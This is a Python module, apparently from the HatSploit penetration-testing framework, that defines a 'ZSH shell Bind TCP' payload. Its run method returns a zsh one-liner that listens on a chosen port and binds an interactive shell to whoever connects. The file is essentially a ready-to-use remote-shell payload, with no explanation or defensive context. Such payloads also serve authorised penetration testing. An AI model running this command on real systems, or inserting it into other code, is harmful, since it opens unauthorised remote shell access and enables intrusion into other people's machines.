"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "ZSH shell Bind TCP",
            'Payload': "unix/generic/zsh_bind_tcp",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "ZSH shell bind TCP payload.",
            'Arch': ARCH_GENERIC,
            'Platform': OS_UNIX,
            'Type': BIND_TCP,
        })

    def run(self):
        payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp -l {self.rport.value} && ztcp -a $REPLY && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
        return payload
